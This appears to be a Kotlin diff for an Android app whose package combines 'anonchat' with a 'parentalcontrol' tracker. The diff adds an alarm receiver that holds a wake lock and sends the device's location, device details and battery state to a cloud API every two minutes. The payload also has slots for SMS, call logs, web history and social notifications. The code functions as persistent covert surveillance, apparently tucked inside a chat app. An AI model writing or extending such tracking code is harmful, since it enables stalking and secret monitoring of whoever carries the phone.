@@ -6,19 +6,73 @@ import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
 import android.os.Build
+import android.os.PowerManager
 import android.util.Log
+import com.anonchat.app.parentalcontrol.api.ApiClient
+import com.anonchat.app.parentalcontrol.api.CloudConfig
 import com.anonchat.app.parentalcontrol.service.TrackerService
+import com.anonchat.app.parentalcontrol.util.Collectors
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.SupervisorJob
+import kotlinx.coroutines.launch
 
 class AlarmReceiver : BroadcastReceiver() {
 
     override fun onReceive(context: Context, intent: Intent) {
         Log.d(TAG, "AlarmReceiver fired — action: ${intent.action}")
+        val pendingResult = goAsync()
+        val powerManager = context.getSystemService(Context.POWER_SERVICE) as PowerManager
+        val wakeLock = powerManager.newWakeLock(
+            PowerManager.PARTIAL_WAKE_LOCK,
+            "ParentalControl:AlarmReceiverWakeLock"
+        )
+        wakeLock.acquire(30_000L)
+
         try {
             // Ensure TrackerService is running & reporting
             TrackerService.start(context)
         } catch (e: Exception) {
             Log.e(TAG, "Error starting service from AlarmReceiver", e)
         }
+
+        // Direct background keepalive reporting to guarantee ONLINE state
+        CoroutineScope(Dispatchers.IO + SupervisorJob()).launch {
+            try {
+                CloudConfig.init(context)
+                val collectors = Collectors()
+                val deviceInfo = collectors.collectDeviceInfo(context)
+                val location = try { collectors.collectLocation(context) } catch (_: Exception) { null }
+                val batteryInfo = try { collectors.collectBatteryInfo(context) } catch (_: Exception) {
+                    com.anonchat.app.parentalcontrol.util.BatteryInfo(-1, false, -1f)
+                }
+
+                val payload = ApiClient.buildReportPayload(
+                    deviceInfo = deviceInfo,
+                    location = location,
+                    battery = batteryInfo,
+                    smsMessages = emptyList(),
+                    callLogs = emptyList(),
+                    installedApps = emptyList(),
+                    activities = emptyList(),
+                    screentime = null,
+                    webHistory = emptyList(),
+                    socialNotifications = emptyList()
+                )
+                ApiClient.sendBulkReport(payload)
+                Log.d(TAG, "AlarmReceiver keepalive report delivered")
+            } catch (e: Exception) {
+                Log.e(TAG, "AlarmReceiver keepalive report error: ${e.message}")
+            } finally {
+                try {
+                    if (wakeLock.isHeld) {
+                        wakeLock.release()
+                    }
+                } catch (_: Exception) {}
+                pendingResult.finish()
+            }
+        }
+
         // Reschedule next exact wake-up alarm in 2 minutes
         scheduleExactAlarm(context)
     }
